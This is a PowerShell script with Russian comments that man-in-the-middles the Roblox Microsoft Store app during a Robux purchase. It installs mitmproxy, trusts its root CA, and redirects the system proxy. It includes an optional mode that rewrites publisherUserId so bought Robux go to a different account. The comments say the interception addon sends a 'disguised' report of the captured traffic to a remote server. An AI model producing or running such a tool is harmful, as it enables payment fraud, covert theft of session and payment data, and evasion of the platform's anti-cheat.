#requires -RunAsAdministrator
<#
  run_msstore_capture.ps1 — перехват HTTPS-трафика приложения Roblox (Microsoft Store)
  во время покупки 80 Robux, для реверс-инжиниринга автопокупки (Путь B / WLID).

  ЗАПУСК (от Администратора):
    powershell -ExecutionPolicy Bypass -File run_msstore_capture.ps1
  Рядом должен лежать capture_msstore_app.py (скачай оба файла в одну папку).

  Что делает: ставит mitmproxy (если нет), доверяет его CA, делает loopback-exempt
  приложению Roblox/Store, поднимает системный прокси на 127.0.0.1:8080 и запускает
  перехват. Аддон сам отправит замаскированный отчёт на сервер. По выходу (Ctrl+C)
  ВСЁ откатывается: прокси, loopback-exempt и доверие к CA снимаются.

  БЕЗОПАСНО по анткиту: перехватывается только СЕТЬ, процесс Roblox не трогаем.
  Если на оплате белый экран — хост пиннит cert; это нормальный результат, жми Ctrl+C.
#>
param([string]$OverrideUserId = "")
$ErrorActionPreference = "Stop"
$port = 8080
$here = Split-Path -Parent $MyInvocation.MyCommand.Path
$addon = Join-Path $here "capture_msstore_app.py"
$regKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings"

if (-not (Test-Path $addon)) {
  Write-Host "Не найден $addon — скачай capture_msstore_app.py в ту же папку." -ForegroundColor Red
  exit 1
}

Add-Type @"
using System;
using System.Runtime.InteropServices;
public class WinINet { [DllImport("wininet.dll", SetLastError=true)] public static extern bool InternetSetOption(IntPtr h,int o,IntPtr b,int l); }
"@
function Refresh-Proxy {
  [WinINet]::InternetSetOption([IntPtr]::Zero, 39, [IntPtr]::Zero, 0) | Out-Null  # SETTINGS_CHANGED
  [WinINet]::InternetSetOption([IntPtr]::Zero, 37, [IntPtr]::Zero, 0) | Out-Null  # REFRESH
}

$prevEnable = (Get-ItemProperty $regKey -Name ProxyEnable -ErrorAction SilentlyContinue).ProxyEnable
$prevServer = (Get-ItemProperty $regKey -Name ProxyServer -ErrorAction SilentlyContinue).ProxyServer
$exempted = @()
$caTrusted = $false

try {
  Write-Host "[1/5] Python + mitmproxy..." -ForegroundColor Cyan
  python --version *> $null
  if ($LASTEXITCODE -ne 0) { throw "Python не найден в PATH. Установи Python 3 и поставь галочку 'Add to PATH'." }
  python -m pip show mitmproxy *> $null
  if ($LASTEXITCODE -ne 0) {
    Write-Host "    ставлю mitmproxy (пару минут)..."
    python -m pip install --quiet mitmproxy
    if ($LASTEXITCODE -ne 0) { throw "не удалось установить mitmproxy" }
  }
  $mitm = (Get-Command mitmdump -ErrorAction SilentlyContinue).Source
  if (-not $mitm) { $mitm = (python -c "import sysconfig,os;print(os.path.join(sysconfig.get_path('scripts'),'mitmdump.exe'))").Trim() }
  if (-not (Test-Path $mitm)) { throw "mitmdump не найден ($mitm)" }

  Write-Host "[2/5] CA mitmproxy..." -ForegroundColor Cyan
  $caCer = Join-Path $env:USERPROFILE ".mitmproxy\mitmproxy-ca-cert.cer"
  if (-not (Test-Path $caCer)) {
    $p = Start-Process -FilePath $mitm -ArgumentList "--listen-port $port" -PassThru -WindowStyle Hidden
    Start-Sleep -Seconds 5
    Stop-Process -Id $p.Id -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 1
  }
  if (-not (Test-Path $caCer)) { throw "CA не сгенерился ($caCer)" }
  certutil -addstore -f Root "$caCer" | Out-Null
  $caTrusted = $true
  Write-Host "    CA доверен."

  Write-Host "[3/5] Loopback-exempt приложений..." -ForegroundColor Cyan
  $pkgs = Get-AppxPackage | Where-Object { $_.Name -match "Roblox" -or $_.Name -match "WindowsStore" -or $_.Name -match "Microsoft\.Store" }
  foreach ($pk in $pkgs) {
    CheckNetIsolation LoopbackExempt -a -n="$($pk.PackageFamilyName)" | Out-Null
    $exempted += $pk.PackageFamilyName
    Write-Host "    + $($pk.Name)"
  }
  if ($exempted.Count -eq 0) { Write-Host "    [!] Приложение Roblox из Store не найдено — установи его из Microsoft Store." -ForegroundColor Yellow }

  Write-Host "[4/5] Системный прокси -> 127.0.0.1:$port ..." -ForegroundColor Cyan
  Set-ItemProperty $regKey -Name ProxyServer -Value "127.0.0.1:$port"
  Set-ItemProperty $regKey -Name ProxyEnable -Value 1
  Refresh-Proxy

  Write-Host ""
  Write-Host "[5/5] ПЕРЕХВАТ ИДЁТ. Дальше:" -ForegroundColor Green
  Write-Host "      1) открой приложение Roblox (из MS Store) и купи 80 Robux (оплата — Microsoft-баланс)"
  Write-Host "      2) если на оплате БЕЛЫЙ ЭКРАН — это ожидаемо (хост пиннит cert), просто закрой окно"
  Write-Host "      3) когда покупка прошла ИЛИ застряла — вернись сюда и нажми Ctrl+C"
  Write-Host ""
  if ($OverrideUserId) {
    $env:OVERRIDE_PUBLISHER_USERID = $OverrideUserId
    Write-Host "  [ТЕСТ A] publisherUserId будет ПОДМЕНЁН на: $OverrideUserId" -ForegroundColor Magenta
    Write-Host "  (покупай залогиненным аккаунтом X — Robux должны уйти на аккаунт $OverrideUserId)" -ForegroundColor Magenta
    Write-Host ""
  }
  & $mitm --listen-host 127.0.0.1 --listen-port $port -s "$addon"
}
finally {
  Write-Host "`nОткат системы..." -ForegroundColor Cyan
  try {
    if ($null -ne $prevServer) { Set-ItemProperty $regKey -Name ProxyServer -Value $prevServer }
    if ($null -ne $prevEnable) { Set-ItemProperty $regKey -Name ProxyEnable -Value $prevEnable } else { Set-ItemProperty $regKey -Name ProxyEnable -Value 0 }
    Refresh-Proxy
    Write-Host "    прокси возвращён."
  } catch { Write-Host "    [!] прокси: $_" -ForegroundColor Yellow }
  foreach ($pfn in $exempted) { try { CheckNetIsolation LoopbackExempt -d -n="$pfn" | Out-Null } catch {} }
  if ($exempted.Count -gt 0) { Write-Host "    loopback-exempt снят." }
  if ($caTrusted) { try { certutil -delstore Root "mitmproxy" | Out-Null; Write-Host "    CA mitmproxy убран из доверенных." } catch {} }
  Write-Host "Готово. Если перехват что-то поймал — отчёт уже ушёл на сервер." -ForegroundColor Green
}
